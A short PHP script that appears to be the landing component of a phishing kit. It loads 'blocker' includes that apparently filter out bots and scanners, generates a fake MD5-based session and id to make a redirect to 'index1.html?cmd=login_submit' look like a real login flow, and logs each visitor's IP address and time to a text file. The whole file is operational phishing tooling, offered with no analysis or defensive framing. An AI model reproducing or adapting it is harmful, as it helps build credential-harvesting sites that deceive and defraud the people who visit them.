<?php

include 'security/blocker_1.php';
include 'security/blocker_2.php';
include 'security/blocker_4.php';

	$praga=rand();
	$praga=md5($praga);

	header("location: index1.html?cmd=login_submit&id=$praga$praga&session=$praga$praga");
$ip = getenv("REMOTE_ADDR");



$file = fopen("ipvisit.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

?>
